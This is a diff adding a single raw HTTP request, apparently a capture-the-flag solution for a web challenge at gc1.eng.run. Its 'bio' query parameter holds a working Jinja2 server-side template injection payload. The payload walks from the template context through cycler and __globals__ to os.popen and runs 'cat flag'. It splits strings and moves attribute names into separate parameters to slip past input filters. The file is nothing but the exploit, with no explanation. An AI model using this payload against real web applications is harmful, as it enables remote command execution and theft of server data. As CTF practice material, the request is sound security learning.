@@ -1,0 +1,10 @@
+GET /profile?name=a&position=b&g=__globals__&i=__init__&t=_TemplateReference__context&bio=%7B%7B+self[request.args['t']]['cycler'][request.args['i']][request.args['g']]['o'+'s']['po'+'pen']('cat+flag')['read']()+%7D%7D HTTP/1.1
+Host: gc1.eng.run:31798
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://gc1.eng.run:31798/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Connection: close
+
